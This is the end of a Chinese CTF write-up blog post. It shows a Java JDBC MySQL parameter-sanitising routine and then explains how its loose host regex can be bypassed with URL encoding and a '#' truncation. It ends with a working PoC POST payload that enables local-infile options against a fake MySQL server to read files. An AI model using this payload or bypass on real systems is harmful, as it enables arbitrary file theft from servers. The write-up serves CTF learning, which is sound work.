</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>checkParams</span><span class=p>(</span><span class=n>Map</span><span class=o>&lt;</span><span class=n>String</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=n>map</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>map</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>map</span><span class=p>.</span><span class=na>isEmpty</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Map</span><span class=o>&lt;</span><span class=n>String</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=n>parseMysqlUrlParamsToMap</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>parseMysqlUrlParamsToMap</span><span class=p>(</span><span class=n>URLDecoder</span><span class=p>.</span><span class=na>decode</span><span class=p>(</span><span class=n>parseParamsMapToMysqlParamUrl</span><span class=p>(</span><span class=n>map</span><span class=p>),</span><span class=w> </span><span class=s>&#34;UTF-8&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>map</span><span class=p>.</span><span class=na>clear</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>map</span><span class=p>.</span><span class=na>putAll</span><span class=p>(</span><span class=n>parseMysqlUrlParamsToMap</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Iterator</span><span class=o>&lt;</span><span class=n>Map</span><span class=p>.</span><span class=na>Entry</span><span class=o>&lt;</span><span class=n>String</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>&gt;&gt;</span><span class=w> </span><span class=n>it</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>map</span><span class=p>.</span><span class=na>entrySet</span><span class=p>().</span><span class=na>iterator</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=n>it</span><span class=p>.</span><span class=na>hasNext</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>Map</span><span class=p>.</span><span class=na>Entry</span><span class=o>&lt;</span><span class=n>String</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=n>next</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>it</span><span class=p>.</span><span class=na>next</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>String</span><span class=w> </span><span class=n>key</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>next</span><span class=p>.</span><span class=na>getKey</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>Object</span><span class=w> </span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>next</span><span class=p>.</span><span class=na>getValue</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>StringUtils</span><span class=p>.</span><span class=na>isBlank</span><span class=p>(</span><span class=n>key</span><span class=p>)</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>value</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>StringUtils</span><span class=p>.</span><span class=na>isBlank</span><span class=p>(</span><span class=n>value</span><span class=p>.</span><span class=na>toString</span><span class=p>()))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>it</span><span class=p>.</span><span class=na>remove</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>isNotSecurity</span><span class=p>(</span><span class=n>key</span><span class=p>,</span><span class=w> </span><span class=n>value</span><span class=p>.</span><span class=na>toString</span><span class=p>()))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Exception</span><span class=p>(</span><span class=s>&#34;Invalid mysql connection parameters: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>parseParamsMapToMysqlParamUrl</span><span class=p>(</span><span class=n>map</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>UnsupportedEncodingException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Exception</span><span class=p>(</span><span class=s>&#34;mysql connection cul decode error: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>e</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>boolean</span><span class=w> </span><span class=nf>isNotSecurity</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>str</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>str2</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>boolean</span><span class=w> </span><span class=n>z</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>true</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>str3</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>MYSQL_SENSITIVE_PARAMS</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>StringUtils</span><span class=p>.</span><span class=na>isBlank</span><span class=p>(</span><span class=n>str3</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=kc>false</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>split</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>str3</span><span class=p>.</span><span class=na>split</span><span class=p>(</span><span class=n>COMMA</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>length</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>split</span><span class=p>.</span><span class=na>length</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=kc>true</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>i</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=n>length</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>break</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>isNotSecurity</span><span class=p>(</span><span class=n>str</span><span class=p>,</span><span class=w> </span><span class=n>str2</span><span class=p>,</span><span class=w> </span><span class=n>split</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>z</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>false</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>break</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>i</span><span class=o>++</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=o>!</span><span class=n>z</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>boolean</span><span class=w> </span><span class=nf>isNotSecurity</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>str</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>str2</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>str3</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>str</span><span class=p>.</span><span class=na>toLowerCase</span><span class=p>().</span><span class=na>contains</span><span class=p>(</span><span class=n>str3</span><span class=p>.</span><span class=na>toLowerCase</span><span class=p>())</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>str2</span><span class=p>.</span><span class=na>toLowerCase</span><span class=p>().</span><span class=na>contains</span><span class=p>(</span><span class=n>str3</span><span class=p>.</span><span class=na>toLowerCase</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>checkUrlIsSafe</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>str</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Matcher</span><span class=w> </span><span class=n>matcher</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Pattern</span><span class=p>.</span><span class=na>compile</span><span class=p>(</span><span class=n>BLACKLIST_REGEX</span><span class=p>).</span><span class=na>matcher</span><span class=p>(</span><span class=n>str</span><span class=p>.</span><span class=na>toLowerCase</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>StringBuilder</span><span class=w> </span><span class=n>sb</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>StringBuilder</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=n>matcher</span><span class=p>.</span><span class=na>find</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>sb</span><span class=p>.</span><span class=na>length</span><span class=p>()</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>sb</span><span class=p>.</span><span class=na>append</span><span class=p>(</span><span class=s>&#34;, &#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>sb</span><span class=p>.</span><span class=na>append</span><span class=p>(</span><span class=n>matcher</span><span class=p>.</span><span class=na>group</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>sb</span><span class=p>.</span><span class=na>length</span><span class=p>()</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Exception</span><span class=p>(</span><span class=s>&#34;url contains blacklisted characters: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=p>((</span><span class=n>Object</span><span class=p>)</span><span class=w> </span><span class=n>sb</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Exception</span><span class=p>(</span><span class=s>&#34;error occurred during url security check: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>e</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>appendMysqlForceParams</span><span class=p>(</span><span class=n>Map</span><span class=o>&lt;</span><span class=n>String</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=n>map</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>map</span><span class=p>.</span><span class=na>putAll</span><span class=p>(</span><span class=n>parseMysqlUrlParamsToMap</span><span class=p>(</span><span class=s>&#34;allowLoadLocalInfile=false&amp;autoDeserialize=false&amp;allowLocalInfile=false&amp;allowUrlInLocalInfile=false&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>这代码全是check没吊用，其中Host地方waf并不严格可以绕过</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>JDBC_MATCH_REGEX</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;(?i)jdbc:(?i)(mysql)://([^:]+)(:[0-9]+)?(/[a-zA-Z0-9_-]*[\\.\\-]?)?&#34;</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><ul><li><code>([^:]+)</code> 可以一直匹配所有非冒号字符串</li><li>通过 url 全字符编码可以绕过关键词匹配waf</li><li>可以使用 <code>#</code> 来忽略最后插入的安全策略</li></ul><p>就是正则的问题了，看了一下文章相当于复现一个CVE，开一个<code>Fake_MySQL_Server</code>就可以了，放个poc</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/jdbc
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>post:
</span></span><span class=line><span class=cl>host=ADDRESS=(host=127.0.0.1)(port=3306)(database=test)(user=fileread_file%3A%2F%2F%2F.)(%61%6c%6c%6f%77%4c%6f%61%64%4c%6f%63%61%6c%49%6e%66%69%6c%65=true)(%61%6c%6c%6f%77%4c%6f%61%64%4c%6f%63%61%6c%49%6e%66%69%6c%65%49%6e%50%61%74%68=%2F)(%61%6c%6c%6f%77%55%72%6c%49%6e%4c%6f%63%61%6c%49%6e%66%69%6c%65=true)(%6d%61%78%41%6c%6c%6f%77%65%64%50%61%63%6b%65%74=655360)  #/test&amp;port=3306&amp;database=test&amp;extraParams={}&amp;username=test&amp;password=root
</span></span></code></pre></td></tr></table></div></div><p><del>其实吧，我不会</del></p><h2 id=su_easyk8s_on_aliyunreally-very-easy>SU_easyk8s_on_aliyun(REALLY VERY EASY)</h2><p>网上wp很多不写了</p></section><footer class=article-footer><section class=article-tags><a href=/tags/flask/>Flask</a>
<a href=/tags/php/>Php</a>
<a href=/tags/%E5%87%BA%E9%A2%98/>出题</a>
<a href=/tags/jdbc/>Jdbc</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/shudaoshan-2024/><div class=article-details><h2 class=article-title>蜀道山2024</h2></div></a></article><article><a href=/p/dasctf-2025-first-half-year/><div class=article-details><h2 class=article-title>DASCTF2025上半年赛</h2></div></a></article><article><a href=/p/iron-three-2024/><div class=article-details><h2 class=article-title>铁三2024</h2></div></a></article><article><a href=/p/shctf2024/><div class=article-details><h2 class=article-title>SHCTF2024</h2></div></a></article><article><a href=/p/cductf2024/><div class=article-details><h2 class=article-title>CDUCTF2024</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
2024 -
2025 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>